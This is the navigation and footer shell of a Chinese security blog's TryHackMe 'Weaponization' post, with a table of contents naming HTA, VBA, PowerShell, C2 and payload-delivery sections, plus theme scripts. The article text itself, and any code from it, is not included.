}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://hybcx.xyz" target="_blank">hybcx</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/TryHackMe/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>TryHackMe<span class="tagsPageCount">42</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/07/10/thm-hong-dui-zhen-cha/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">THM-红队侦察</div></div></a></div><div class="next-post pull-right"><a href="/2024/07/14/ctf-shua-ti/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">CTF刷题</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>喜欢这篇文章的人也看了</span></div><div class="relatedPosts-list"><div><a href="/2024/08/08/thm-bypass-uac/" title="THM-ByPass_UAC"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-08-08</div><div class="title">THM-ByPass_UAC</div></div></a></div><div><a href="/2024/02/14/thm-basic-pentesting/" title="THM-Basic Pentesting"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-02-14</div><div class="title">THM-Basic Pentesting</div></div></a></div><div><a href="/2024/07/10/thm-c2-jian-jie/" title="THM-C2简介"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-07-10</div><div class="title">THM-C2简介</div></div></a></div><div><a href="/2024/06/17/thm-corp/" title="THM-Corp"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-06-17</div><div class="title">THM-Corp</div></div></a></div><div><a href="/2024/06/09/thm-enumerating-active-directory/" title="THM-Enumerating Active Directory"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-06-09</div><div class="title">THM-Enumerating Active Directory</div></div></a></div><div><a href="/2024/07/16/thm-enumeration/" title="THM-Enumeration"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-07-16</div><div class="title">THM-Enumeration</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="anzhiyufont anzhiyu-icon-comments"></i><span> 评论</span></div><div class="comment-randomInfo"><a onclick="anzhiyu.addRandomCommentInfo()" href="javascript:void(0)">匿名评论</a><a href="/privacy" style="margin-left: 4px">隐私政策</a></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div><div class="comment-barrage"></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/08/24/64e6ce9c507bb.png" alt="status"/></div></div><div class="author-info__description"><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">这有关于<b style="color:#fff">产品、设计、开发</b>相关的问题和看法，还有<b style="color:#fff">文章翻译</b>和<b style="color:#fff">分享</b>。</div><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">相信你可以在这里找到对你有用的<b style="color:#fff">知识</b>和<b style="color:#fff">教程</b>。</div></div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/about"><h1 class="author-info__name">hybcx</h1><div class="author-info__desc">只需热爱, 未来可期！</div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/hybchenxing" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a><a class="social-icon faa-parent animated-hover" href="https://space.bilibili.com/1761635300" target="_blank" title="Email"><i class="anzhiyufont anzhiyu-icon-bilibili"></i></a></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">0x01 介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFweaponization"><span class="toc-number">1.1.</span> <span class="toc-text">什么是Weaponization</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-%E9%83%A8%E7%BD%B2windows%E6%9C%BA%E5%99%A8"><span class="toc-number">2.</span> <span class="toc-text">0x02 部署Windows机器</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-windows-scripting-host-wsh"><span class="toc-number">3.</span> <span class="toc-text">0x03 Windows Scripting Host (WSH)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#wsh"><span class="toc-number">3.1.</span> <span class="toc-text">WSH</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-an-html-application-hta"><span class="toc-number">4.</span> <span class="toc-text">0x04 An HTML Application (HTA)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#html-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F"><span class="toc-number">4.1.</span> <span class="toc-text">HTML 应用程序</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hta%E5%8F%8D%E5%90%91%E8%BF%9E%E6%8E%A5"><span class="toc-number">4.2.</span> <span class="toc-text">HTA反向连接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E8%BF%87-metasploit-%E7%9A%84%E6%81%B6%E6%84%8F-hta"><span class="toc-number">4.3.</span> <span class="toc-text">通过 Metasploit 的恶意 HTA</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-visual-basic-for-application-vba"><span class="toc-number">5.</span> <span class="toc-text">0x05 Visual Basic for Application (VBA)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#visual-basic-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F-vba"><span class="toc-number">5.1.</span> <span class="toc-text">Visual Basic 应用程序 (VBA)</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06-powershell-psh"><span class="toc-number">6.</span> <span class="toc-text">0x06 PowerShell (PSH)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#powershell-psh"><span class="toc-number">6.1.</span> <span class="toc-text">PowerShell (PSH)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#execution-policy"><span class="toc-number">6.2.</span> <span class="toc-text">Execution Policy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bypass-execution-policy"><span class="toc-number">6.3.</span> <span class="toc-text">Bypass Execution Policy</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x07-c2"><span class="toc-number">7.</span> <span class="toc-text">0x07 C2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFc2"><span class="toc-number">7.1.</span> <span class="toc-text">什么是C2？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cobalt-strike"><span class="toc-number">7.2.</span> <span class="toc-text">Cobalt Strike</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#powershell-empire"><span class="toc-number">7.3.</span> <span class="toc-text">PowerShell Empire</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#metasploit-%E5%85%83%E5%88%86%E6%9E%90%E8%BD%AF%E4%BB%B6"><span class="toc-number">7.4.</span> <span class="toc-text">Metasploit 元分析软件</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x08-delivery-techniques"><span class="toc-number">8.</span> <span class="toc-text">0x08 Delivery Techniques</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#email-delivery"><span class="toc-number">8.1.</span> <span class="toc-text">Email Delivery</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-delivery"><span class="toc-number">8.2.</span> <span class="toc-text">Web Delivery</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#usb-delivery"><span class="toc-number">8.3.</span> <span class="toc-text">USB Delivery</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x09-%E7%BB%83%E4%B9%A0"><span class="toc-number">9.</span> <span class="toc-text">0x09 练习</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-sha-he-gui-bi/" title="THM-沙盒规避">THM-沙盒规避</a><time datetime="2024-08-21T09:41:49.000Z" title="发表于 2024-08-21 17:41:49">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-fang-huo-qiang/" title="THM-防火墙">THM-防火墙</a><time datetime="2024-08-21T07:07:33.000Z" title="发表于 2024-08-21 15:07:33">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-wang-luo-an-quan-jie-jue-fang-an/" title="THM-网络安全解决方案">THM-网络安全解决方案</a><time datetime="2024-08-21T01:37:19.000Z" title="发表于 2024-08-21 09:37:19">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/20/thm-kao-tu-di-wei-sheng/" title="THM-靠土地为生">THM-靠土地为生</a><time datetime="2024-08-20T10:08:09.000Z" title="发表于 2024-08-20 18:08:09">2024-08-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/20/thm-tao-bi-ri-zhi-ji-lu-he-jian-kong/" title="THM-逃避日志记录和监控">THM-逃避日志记录和监控</a><time datetime="2024-08-20T06:51:56.000Z" title="发表于 2024-08-20 14:51:56">2024-08-20</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2020 - 2024 By <a class="footer-bar-link" href="/" title="hybcx" target="_blank">hybcx</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">204</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">23</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">30</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 0.88rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 0.88rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 0.88rem;">Java反序列化<sup>3</sup></a><a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 0.88rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 0.88rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 0.88rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">PHP代码审计<sup>2</sup></a><a href="/tags/SecBook/" style="font-size: 0.88rem;">SecBook<sup>1</sup></a><a href="/tags/TryHackMe/" style="font-size: 0.88rem;">TryHackMe<sup>42</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 0.88rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 0.88rem;">tryhackme<sup>1</sup></a><a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 0.88rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">代码审计<sup>1</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">内网靶场<sup>2</sup></a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 0.88rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 0.88rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 0.88rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="anzhiyufont anzhiyu-icon-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8152976493" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="algolia-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="search-wrap"><div id="algolia-search-input"></div><hr/><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-info"><div class="algolia-stats"></div><div class="algolia-poweredBy"></div></div></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/medium-zoom@1.1.0/dist/medium-zoom.min.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
var HoldLog = console.log;
console.log = function () {};
let now1 = new Date();
queueMicrotask(() => {
  const Log = function () {
    HoldLog.apply(console, arguments);
  }; //在恢复前输出日志
  const grt = new Date("04/01/2021 00:00:00"); //此处修改你的建站时间或者网站上线时间
  now1.setTime(now1.getTime() + 250);
  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
  const dnum = Math.floor(days);
  const ascll = [
    `欢迎使用安知鱼!`,
    `生活明朗, 万物可爱`,
    `
        
       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
        
        `,
    "已上线",
    dnum,
    "天",
    "©2020 By 安知鱼 V1.6.12",
  ];
  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];

  setTimeout(
    Log.bind(
      console,
      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
      "color:#425AEF",
      "",
      "color:#425AEF",
      "color:#425AEF",
      "",
      "color:#425AEF",
      ""
    )
  );
  setTimeout(
    Log.bind(
      console,
      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
      "color:white; background-color:#4fd953",
      "",
      "",
      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
    )
  );

  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(
      console,
      "%c ⚡ Powered by 安知鱼 %c 你正在访问 hybcx 的博客.",
      "color:white; background-color:#f0ad4e",
      ""
    )
  );

  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
  );
});</script><script async src="/anzhiyu/random.js"></script><script src="https://cdn.cbd.int/algoliasearch@4.18.0/dist/algoliasearch-lite.umd.js"></script><script src="https://cdn.cbd.int/instantsearch.js@4.60.0/dist/instantsearch.production.min.js"></script><script src="/js/search/algolia.js"></script><div class="js-pjax"><script>(() => {
  const initValine = () => {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: '7Sc5uZwcoDwvbgqkpwGKyCpN-gzGzoHsz',
      appKey: 'iEFJUGMm2FY91n9ZG1gdKBSy',
      avatar: 'mp',
      serverURLs: '',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  const loadValine = async () => {
    if (typeof Valine === 'function') initValine()
    else {
